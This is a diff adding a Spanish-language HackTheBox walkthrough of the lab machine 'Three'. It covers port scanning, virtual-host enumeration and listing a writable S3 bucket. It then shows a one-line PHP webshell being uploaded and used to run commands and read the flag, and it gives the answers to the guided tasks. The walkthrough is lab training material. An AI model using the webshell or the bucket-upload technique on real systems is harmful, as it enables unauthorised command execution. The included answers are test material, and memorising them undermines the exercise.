@@ -1,0 +1,298 @@
+---
+titulo: "Three"
+plataforma: HackTheBox
+dificultad: Muy fácil
+so: Linux
+fecha: 2026-11-17
+tecnicas:
+  - Escaneo de puertos
+  - Enumeración de subdominios
+  - Amazon S3
+  - Inyección de comandos
+resumen: "Máquina Linux con una web en Apache que esconde un subdominio con un bucket de Amazon S3 escribible: subiendo un shell.php se consigue ejecución de comandos y se lee la flag."
+serie:
+  nombre: Starting Point
+  tier: 1
+borrador: true
+---
+
+Máquina del Tier 1 de Starting Point. Las preguntas guiadas (tasks) de HackTheBox aparecen plegadas en la
+sección donde se responden: intenta contestarlas antes de abrirlas.
+
+<Ruta
+  titulo="Camino seguido en Three, de la conexión a la flag"
+  pasos={[
+    { titulo: 'nmap -sV', detalle: '22/tcp SSH y 80/tcp Apache' },
+    { titulo: 'gobuster vhost', detalle: 'Encuentra s3.thetoppers.htb' },
+    { titulo: 'aws s3 ls', detalle: 'El bucket thetoppers.htb es la raíz web' },
+    { titulo: 'aws s3 cp shell.php', detalle: 'Sube una webshell PHP al bucket' },
+    { titulo: 'shell.php?cmd=', detalle: 'Ejecuta comandos y lee la flag', meta: true },
+  ]}
+/>
+
+> La IP `10.129.227.248` es la que tenía la máquina en mi sesión; a ti te saldrá otra.
+
+## Reconocimiento
+
+Lo primero es comprobar que llega la conexión con la máquina:
+
+<Cmd c="ping 10.129.227.248" notas={{ "10.129.227.248": "IP de la máquina objetivo." }} />
+
+Lo detengo con `Ctrl+C` y muestra el resumen:
+
+```text
+64 bytes from 10.129.227.248: icmp_seq=1 ttl=63 time=7.86 ms
+64 bytes from 10.129.227.248: icmp_seq=2 ttl=63 time=7.96 ms
+...
+^C
+--- 10.129.227.248 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3005ms
+```
+
+La máquina responde a todo: 4 paquetes enviados y 4 recibidos.
+
+## Enumeración
+
+### Puertos abiertos
+
+Busco los puertos abiertos y qué servicio hay detrás de cada uno:
+
+<Cmd c="nmap -sV 10.129.227.248" notas={{ "10.129.227.248": "IP de la máquina objetivo." }} />
+
+Sin indicar puertos, nmap revisa los 1000 más comunes:
+
+```text
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Hay dos puertos abiertos: el **22/tcp**, con SSH, y el **80/tcp**, con un servidor web Apache 2.4.29.
+
+<Pista titulo="Tarea 1 · ¿Cuántos puertos TCP están abiertos?">
+  **2**.
+</Pista>
+
+### La web y su dominio
+
+La web usa el dominio `thetoppers.htb`. Como en el laboratorio no hay un servidor DNS que lo resuelva, lo
+añado a mano al final de `/etc/hosts`, el fichero en el que Linux busca los nombres antes de preguntar al
+DNS:
+
+<Cmd
+  c={`echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts`}
+  notas={{
+    "10.129.227.248 thetoppers.htb": "Línea que se añade: la IP de la máquina y el nombre que apunta a ella.",
+    "/etc/hosts": "Fichero de resolución de nombres local. Solo root puede escribir en él.",
+  }}
+/>
+
+Se usa `sudo tee` en lugar de `sudo echo ... >> /etc/hosts` porque la redirección `>>` la hace la shell del
+usuario, sin privilegios, y no podría escribir en el fichero. Así, `tee` se ejecuta como root y es él quien
+escribe. Como también copia a la salida estándar, muestra la línea añadida:
+
+```text
+10.129.227.248 thetoppers.htb
+```
+
+<Pista titulo="Tarea 3 · Sin un servidor DNS, ¿qué fichero de Linux podemos usar para resolver nombres de host a direcciones IP y así acceder a las webs que apuntan a esos nombres?">
+  **/etc/hosts**.
+</Pista>
+
+Ya puedo pedir la página principal. Con `-i`, `curl` muestra también las cabeceras de la respuesta:
+
+<Cmd c="curl -i http://thetoppers.htb" notas={{ "http://thetoppers.htb": "URL de la web de la máquina objetivo." }} />
+
+```text
+HTTP/1.1 200 OK
+Server: Apache/2.4.29 (Ubuntu)
+Content-Type: text/html; charset=UTF-8
+
+<title>The Toppers</title>
+...
+<i class="fa fa-envelope" style="width:30px"> </i> Email: mail@thetoppers.htb<br>
+```
+
+Es la web de un grupo de música, The Toppers. En la sección de contacto aparece el correo
+`mail@thetoppers.htb`.
+
+<Pista titulo="Tarea 2 · ¿Cuál es el dominio de la dirección de correo de la sección «Contact» de la web?">
+  **thetoppers.htb**.
+</Pista>
+
+### Subdominios
+
+Un mismo servidor web puede servir webs distintas según el nombre de host que se le pida (virtual hosts).
+Para buscar otros nombres bajo `thetoppers.htb` uso Gobuster en modo `vhost`:
+
+<Cmd
+  c="gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain"
+  notas={{
+    "http://thetoppers.htb": "URL de la web de la máquina objetivo.",
+    "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt": "Diccionario de SecLists con los 5000 subdominios más comunes.",
+  }}
+/>
+
+Con `--append-domain`, a cada palabra del diccionario se le añade `.thetoppers.htb`:
+
+```text
+[+] Url:             http://thetoppers.htb
+[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] Append Domain:   true
+===============================================================
+Found: s3.thetoppers.htb Status: 404 [Size: 21]
+Found: gc._msdcs.thetoppers.htb Status: 400 [Size: 306]
+Progress: 4989 / 4990 (99.98%)
+```
+
+Aparecen dos nombres. `gc._msdcs` devuelve un **400** (petición incorrecta), así que el que interesa es
+**`s3.thetoppers.htb`**. Lo añado también a `/etc/hosts`, en la misma línea que ya tenía el dominio:
+
+<Cmd
+  c={`sudo sed -i 's/thetoppers.htb/thetoppers.htb s3.thetoppers.htb/' /etc/hosts`}
+  notas={{
+    "s/thetoppers.htb/thetoppers.htb s3.thetoppers.htb/": "Añade s3.thetoppers.htb detrás del nombre que ya estaba en la línea.",
+    "/etc/hosts": "Fichero de resolución de nombres local. Solo root puede escribir en él.",
+  }}
+/>
+
+<Pista titulo="Tarea 4 · ¿Qué subdominio se descubre al seguir enumerando?">
+  **s3.thetoppers.htb**.
+</Pista>
+
+### El subdominio s3
+
+Pido el subdominio con `curl`, otra vez con `-i` para ver las cabeceras:
+
+<Cmd c="curl -i http://s3.thetoppers.htb" notas={{ "http://s3.thetoppers.htb": "URL del subdominio descubierto." }} />
+
+```text
+HTTP/1.1 404
+Server: hypercorn-h11
+Access-Control-Allow-Methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
+Access-Control-Allow-Headers: ...,x-amz-acl,x-amz-content-sha256,x-amz-date,...
+
+{"status": "running"}
+```
+
+Las cabeceras `x-amz-*` y el cuerpo `{"status": "running"}` delatan un servicio compatible con **Amazon S3**
+(aquí emulado con LocalStack): el almacenamiento de objetos de AWS, organizado en *buckets*.
+
+<Pista titulo="Tarea 5 · ¿Qué servicio corre en el subdominio descubierto?">
+  **Amazon S3**, el servicio de almacenamiento de objetos de Amazon Web Services.
+</Pista>
+
+Para hablar con él se usa **awscli**, la herramienta de línea de comandos de AWS. Antes de usarla hay que
+configurarla con `aws configure`; como el bucket no comprueba las credenciales, cualquier valor sirve.
+
+<Pista titulo="Tarea 6 · ¿Qué herramienta de línea de comandos se puede usar para interactuar con el servicio del subdominio descubierto?">
+  **awscli**, la interfaz de línea de comandos de AWS.
+</Pista>
+
+<Pista titulo="Tarea 7 · ¿Qué comando se usa para configurar la instalación de AWS CLI?">
+  **aws configure**. Pide la clave de acceso, la clave secreta, la región y el formato de salida; con este
+  bucket cualquier valor vale.
+</Pista>
+
+## Acceso inicial
+
+### El contenido del bucket
+
+Listo el contenido del bucket apuntando `awscli` al servicio de la máquina con `--endpoint-url`:
+
+<Cmd
+  c="aws --endpoint-url=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb"
+  notas={{
+    "ls": "Lista los objetos del bucket.",
+    "s3://thetoppers.htb": "Bucket que se lista, con el mismo nombre que el dominio.",
+  }}
+/>
+
+```text
+                           PRE images/
+2026-11-17 15:35:50          0 .htaccess
+2026-11-17 15:35:50      11952 index.php
+```
+
+El bucket contiene `images/`, `.htaccess` e `index.php`: son los mismos ficheros que sirve la web del
+puerto 80. Es decir, **el bucket es la raíz del sitio web**. Y como hay un `index.php`, el servidor ejecuta
+PHP.
+
+<Pista titulo="Tarea 8 · ¿Qué comando usa esa herramienta para listar todos los buckets de S3?">
+  **aws s3 ls**.
+</Pista>
+
+<Pista titulo="Tarea 9 · ¿En qué lenguaje de scripting web está configurado este servidor para ejecutar ficheros?">
+  **PHP**. El bucket sirve un `index.php` que Apache ejecuta.
+</Pista>
+
+### Subir una webshell
+
+Si puedo escribir en el bucket, puedo dejar en la raíz web un fichero PHP que ejecute lo que yo le pida. Creo
+una webshell mínima: coge el parámetro `cmd` de la URL y lo pasa a `system()`, que lo ejecuta en el sistema.
+
+<Cmd c={`echo '<?php system($_GET["cmd"]); ?>' > shell.php`} notas={{ "shell.php": "Fichero de la webshell que se crea en local." }} />
+
+La subo al bucket con `aws s3 cp`:
+
+<Cmd
+  c="aws --endpoint-url=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb"
+  notas={{
+    "cp": "Copia el fichero local al bucket.",
+    "shell.php": "Fichero local que se sube.",
+    "s3://thetoppers.htb": "Bucket de destino, que es la raíz de la web.",
+  }}
+/>
+
+```text
+upload: ./shell.php to s3://thetoppers.htb/shell.php
+```
+
+### Ejecutar comandos
+
+Como el bucket es la raíz web, el fichero queda accesible en `http://thetoppers.htb/shell.php`, y Apache lo
+ejecuta como PHP. Le paso comandos por el parámetro `cmd` de la URL. Primero, listar el directorio actual:
+
+```text
+http://thetoppers.htb/shell.php?cmd=ls
+images  index.php  shell.php
+```
+
+La flag no está aquí, así que subo un nivel con `ls ../`:
+
+```text
+http://thetoppers.htb/shell.php?cmd=ls+../
+flag.txt  html
+```
+
+Ahí está `flag.txt`. La leo con `less` (el `+` de la URL es el espacio):
+
+```text
+http://thetoppers.htb/shell.php?cmd=less+../flag.txt
+```
+
+La flag no se publica: la tienes que conseguir tú.
+
+<Pista titulo="Flag · Envía la flag que está en /var/www/">
+  La webshell la lee un nivel por encima de la raíz web (`shell.php?cmd=less+../flag.txt`).
+</Pista>
+
+## Escalada de privilegios
+
+No hace falta: Apache ejecuta la webshell con los permisos suficientes para leer la flag en `/var/www/`, así
+que el objetivo se cumple ya con el acceso inicial, sin tener que subir de usuario.
+
+## Lecciones aprendidas
+
+- **Qué fallé:** gasté tiempo en una reverse shell que no hacía falta. Además la lancé mal: apunté a la IP de
+  la víctima en vez de a la mía y sin tener un `nc` escuchando, así que solo daba `Connection refused`. Y la
+  primera webshell la subí con una errata, `<php` en vez de `<?php`, que no la ejecuta.
+- **Lo que enseña la máquina:** un bucket S3 escribible que además es la raíz de la web es ejecución de
+  comandos directa: subes un `.php` y el servidor te lo ejecuta. El fallo no está en el código de la web,
+  sino en los permisos del almacenamiento.
+- **Qué haré la próxima vez:** antes de complicarme con reverse shells, usar la webshell tal cual para leer lo
+  que busco, y comprobar el fichero que subo (contenido y que llega entero) antes de pelearme con el resto.
+
+{/* Redactado por Claude a partir de tus apuntes; revisa sobre todo las frases de "Lecciones aprendidas". */}
